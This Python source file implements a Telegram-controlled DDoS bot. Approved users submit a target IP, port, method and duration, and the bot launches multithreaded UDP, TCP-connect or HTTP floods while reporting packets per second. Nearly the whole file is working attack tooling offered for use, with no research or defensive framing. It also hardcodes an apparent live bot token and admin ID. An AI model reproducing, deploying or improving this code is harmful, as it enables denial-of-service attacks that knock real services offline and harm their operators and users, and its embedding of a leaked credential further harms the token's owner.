# ddos_railway_final.py
import asyncio
import logging
import threading
import time
import random
import socket
import re
import os
import json
from datetime import datetime, timedelta
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes
)

# ---------- CONFIG ----------
BOT_TOKEN = "8278228198:AAG7C97c7R50_gsykoqBMwesCuoRZTciCLA"
ADMIN_IDS = [8210011971]

BLOCKED_PORTS = {22, 25, 443, 3389, 8700, 9031, 17500, 20000, 20001}

# Railway-safe settings (max 100 threads total)
MAX_THREADS = 80           # Safe limit for Railway
SOCKETS_PER_THREAD = 25    # More sockets per thread
DELAY = 0.00001            # Ultra fast delay
HTTP_CONCURRENT = 80

# Power level 1-10 (1=8 threads, 10=80 threads)
POWER_LEVEL = 10
THREADS_LEVEL = {i: max(8, int(MAX_THREADS * i / 10)) for i in range(1, 11)}

# Attack state
attack_running = False
current_attack = {'packets': 0, 'message_id': None, 'total_threads': 0}
attack_lock = threading.Lock()
user_data = {}

# ---------- JSON DB ----------
USERS_FILE = "users.json"
def load_users():
    if os.path.exists(USERS_FILE):
        with open(USERS_FILE) as f:
            return json.load(f)
    return {}
def save_users(u):
    with open(USERS_FILE, 'w') as f:
        json.dump(u, f)
def create_user(uid, name=""):
    u = load_users()
    if str(uid) not in u:
        u[str(uid)] = {"approved": uid in ADMIN_IDS, "expires": None, "total": 0}
        save_users(u)
def is_approved(uid):
    u = load_users().get(str(uid), {})
    if u.get("approved"):
        exp = u.get("expires")
        if exp and datetime.fromisoformat(exp) < datetime.now():
            return False
        return True
    return False
def approve_user(uid, days):
    u = load_users()
    u[str(uid)] = {"approved": True, "expires": (datetime.now() + timedelta(days=days)).isoformat(), "total": 0}
    save_users(u)

# ---------- ATTACK ENGINES (optimized for low threads) ----------
def udp_flood_fast(ip, port, duration):
    global attack_running, current_attack
    end = time.time() + duration
    port = int(port)
    # Create 25 UDP sockets in one thread
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    payload = random._urandom(512)
    # Burst send loop - very fast
    while time.time() < end and attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with attack_lock:
                    current_attack['packets'] += 1
            except:
                pass
        # Minimal delay to prevent CPU 100%
        time.sleep(0.00001)
    for sock in socks:
        sock.close()

def tcp_flood_fast(ip, port, duration):
    global attack_running, current_attack
    end = time.time() + duration
    port = int(port)
    while time.time() < end and attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.05)
            s.connect_ex((ip, port))
            s.close()
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(0.0001)  # 100 microseconds
        except:
            time.sleep(0.001)

def http_flood_fast(url, duration):
    global attack_running, current_attack
    end = time.time() + duration
    session = requests.Session()
    headers = {'User-Agent': 'Mozilla/5.0'}
    while time.time() < end and attack_running:
        try:
            session.get(url, headers=headers, timeout=2)
            with attack_lock:
                current_attack['packets'] += 1
            time.sleep(0.0005)
        except:
            time.sleep(0.005)
    session.close()

def launch_attack(ip, port, duration, method, send_cb):
    global attack_running, current_attack

    attack_running = True
    num_threads = THREADS_LEVEL[POWER_LEVEL]
    with attack_lock:
        current_attack = {
            'ip': ip, 'port': port, 'method': method,
            'duration': duration, 'start': time.time(),
            'packets': 0, 'total_threads': num_threads
        }

    # Select attack function
    if method == 'udp':
        target = udp_flood_fast
        args = (ip, port, duration)
    elif method == 'tcp':
        target = tcp_flood_fast
        args = (ip, port, duration)
    else:
        url = f"http://{ip}:{port}" if port != 443 else f"https://{ip}:{port}"
        target = http_flood_fast
        args = (url, duration)

    # Start threads (limited number, Railway safe)
    threads = []
    for _ in range(num_threads):
        t = threading.Thread(target=target, args=args, daemon=True)
        t.start()
        threads.append(t)

    # Monitor with buttons
    keyboard = [
        [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
    ]
    markup = InlineKeyboardMarkup(keyboard)

    start_time = time.time()
    last_update = 0
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(1)
        if time.time() - last_update >= 2:
            last_update = time.time()
            with attack_lock:
                pkt = current_attack['packets']
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            speed = int(pkt / elapsed) if elapsed else 0
            text = (
                f"💥 *ATTACK ACTIVE* 💥\n\n"
                f"🎯 `{ip}:{port}`\n"
                f"⚙️ Method: `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"🧵 Threads: `{num_threads}` (safe limit)\n\n"
                f"*Use buttons:*"
            )
            try:
                send_cb(text, markup, edit=True, msg_id=current_attack.get('message_id'))
            except:
                pass

    attack_running = False
    for t in threads:
        t.join(timeout=0.5)
    with attack_lock:
        pkt = current_attack['packets']
    avg = int(pkt / duration) if duration else 0
    text = f"✅ *ATTACK COMPLETE*\n\n📦 Total: `{pkt:,}` packets\n💥 Avg speed: `{avg:,}` pps"
    try:
        send_cb(text, None, edit=True, msg_id=current_attack.get('message_id'))
    except:
        pass

# ---------- TELEGRAM HANDLERS ----------
async def start(update, context):
    uid = update.effective_user.id
    create_user(uid, update.effective_user.username)
    if not is_approved(uid):
        await update.message.reply_text("❌ Not approved")
        return
    user_data[uid] = {'step': 'ip'}
    await update.message.reply_text(
        f"⚡ *DDoS Bot* (Railway optimized)\n\n"
        f"Send target IP:\nExample: `192.168.1.1`\n\n"
        f"🔥 Power: `{POWER_LEVEL}x` → {THREADS_LEVEL[POWER_LEVEL]} threads\n"
        f"Use `/power 1-10` to change",
        parse_mode='Markdown'
    )

async def power(update, context):
    global POWER_LEVEL
    if update.effective_user.id not in ADMIN_IDS:
        await update.message.reply_text("❌ Unauthorized")
        return
    if not context.args:
        await update.message.reply_text(f"Power: `{POWER_LEVEL}x` (1-10)\nThreads: {THREADS_LEVEL[POWER_LEVEL]}")
        return
    try:
        lvl = int(context.args[0])
        if 1 <= lvl <= 10:
            POWER_LEVEL = lvl
            await update.message.reply_text(f"✅ Power set to {lvl}x → {THREADS_LEVEL[lvl]} threads")
        else:
            await update.message.reply_text("Use 1-10")
    except:
        await update.message.reply_text("Invalid")

async def stop(update, context):
    global attack_running
    attack_running = False
    await update.message.reply_text("🛑 Attack stopped")

async def myinfo(update, context):
    uid = update.effective_user.id
    u = load_users().get(str(uid), {})
    status = "✅ Approved" if u.get("approved") else "❌ Not"
    await update.message.reply_text(f"📋 *Account*\n\n🆔 `{uid}`\n📊 {status}", parse_mode='Markdown')

async def blocked(update, context):
    await update.message.reply_text(f"🚫 Blocked ports: {', '.join(map(str, sorted(BLOCKED_PORTS)))}")

async def help_cmd(update, context):
    await update.message.reply_text(
        "🤖 *Commands*\n"
        "/start – Setup attack\n"
        "/power 1-10 – Set threads\n"
        "/stop – Stop attack\n"
        "/myinfo – Account\n"
        "/blockedports – Blocked list",
        parse_mode='Markdown'
    )

async def handle(update, context):
    uid = update.effective_user.id
    if not is_approved(uid):
        await update.message.reply_text("❌ Not approved")
        return
    data = user_data.get(uid, {})
    step = data.get('step')
    txt = update.message.text.strip()

    if step == 'ip':
        if not re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', txt):
            await update.message.reply_text("Invalid IP")
            return
        data['ip'] = txt
        data['step'] = 'port'
        user_data[uid] = data
        await update.message.reply_text(f"Port (1-65535):\n🚫 Blocked: {', '.join(map(str, sorted(BLOCKED_PORTS)))}")
    elif step == 'port':
        try:
            p = int(txt)
            if p in BLOCKED_PORTS or p < 1 or p > 65535:
                raise ValueError
            data['port'] = p
            data['step'] = 'method'
            user_data[uid] = data
            kb = [
                [InlineKeyboardButton("🔥 TCP (SYN)", callback_data="method_tcp")],
                [InlineKeyboardButton("💣 UDP Flood", callback_data="method_udp")],
                [InlineKeyboardButton("🌐 HTTP Flood", callback_data="method_http")],
                [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]
            ]
            await update.message.reply_text("Select method:", reply_markup=InlineKeyboardMarkup(kb))
        except:
            await update.message.reply_text("Invalid port")
    elif step == 'duration':
        try:
            dur = int(txt)
            if dur < 5 or dur > 300:
                raise ValueError
            ip = data['ip']
            port = data['port']
            method = data['method']
            del user_data[uid]
            kb = [[InlineKeyboardButton("✅ START", callback_data=f"start_{ip}_{port}_{dur}_{method}")],
                  [InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
            await update.message.reply_text(
                f"🔥 *Confirm*\n\n🎯 {ip}:{port}\n⚙️ {method.upper()}\n⏱️ {dur}s\n💪 Power: {POWER_LEVEL}x\n\nStart?",
                parse_mode='Markdown',
                reply_markup=InlineKeyboardMarkup(kb)
            )
        except:
            await update.message.reply_text("Duration 5-300")
    else:
        await update.message.reply_text("Send /start")

async def button(update, context):
    q = update.callback_query
    await q.answer()
    uid = q.from_user.id
    data = q.data

    if data == "cancel":
        if uid in user_data:
            del user_data[uid]
        await q.edit_message_text("❌ Cancelled")
        return

    if data.startswith("method_"):
        method = data.split("_")[1]
        user_data[uid]['method'] = method
        user_data[uid]['step'] = 'duration'
        await q.edit_message_text(f"✅ Method: {method.upper()}\nSend duration (5-300s):")
        return

    if data.startswith("start_"):
        _, ip, port, dur, method = data.split("_")
        port = int(port); dur = int(dur)
        # Remove any existing user data
        if uid in user_data:
            del user_data[uid]
        # Setup callback for attack
        loop = asyncio.get_event_loop()
        def send_cb(text, markup, edit=False, msg_id=None):
            coro = q.message.reply_text(text, parse_mode='Markdown', reply_markup=markup)
            return asyncio.run_coroutine_threadsafe(coro, loop).result()
        threading.Thread(target=launch_attack, args=(ip, port, dur, method, send_cb), daemon=True).start()
        await q.edit_message_text("🚀 Attack launching!\nUse /stop to halt")
        return

    # Attack control buttons
    global attack_running, current_attack
    if data == "stop_attack":
        attack_running = False
        await q.edit_message_text("🛑 Stopped")
    elif data == "info_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start'])
                rem = current_attack['duration'] - elapsed
                speed = int(pkt/elapsed) if elapsed else 0
                await q.edit_message_text(
                    f"ℹ️ *Info*\n\n📦 Packets: {pkt:,}\n⏱️ Remaining: {rem}s\n💥 Speed: {speed:,} pps",
                    parse_mode='Markdown'
                )
        else:
            await q.edit_message_text("ℹ️ No attack")
    elif data == "refresh_attack":
        if attack_running:
            with attack_lock:
                pkt = current_attack['packets']
                elapsed = int(time.time() - current_attack['start'])
                rem = current_attack['duration'] - elapsed
                prog = int((elapsed / current_attack['duration']) * 20)
                bar = "█" * prog + "░" * (20 - prog)
                speed = int(pkt/elapsed) if elapsed else 0
                text = (
                    f"💥 *ATTACK* 💥\n\n"
                    f"🎯 {current_attack['ip']}:{current_attack['port']}\n"
                    f"📦 {pkt:,} pkts\n"
                    f"⏱️ {elapsed}/{current_attack['duration']}s\n"
                    f"📊 [{bar}]\n"
                    f"💥 {speed:,} pps"
                )
                kb = [
                    [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
                    [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
                ]
                await q.edit_message_text(text, parse_mode='Markdown', reply_markup=InlineKeyboardMarkup(kb))
        else:
            await q.edit_message_text("✅ No attack")

async def error(update, context):
    logging.error(f"Error: {context.error}")

def main():
    print("💥 Railway DDoS Bot Starting...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("power", power))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("myinfo", myinfo))
    app.add_handler(CommandHandler("blockedports", blocked))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle))
    app.add_error_handler(error)
    print("✅ Bot LIVE! Send /start")
    app.run_polling()

if __name__ == "__main__":
    main()
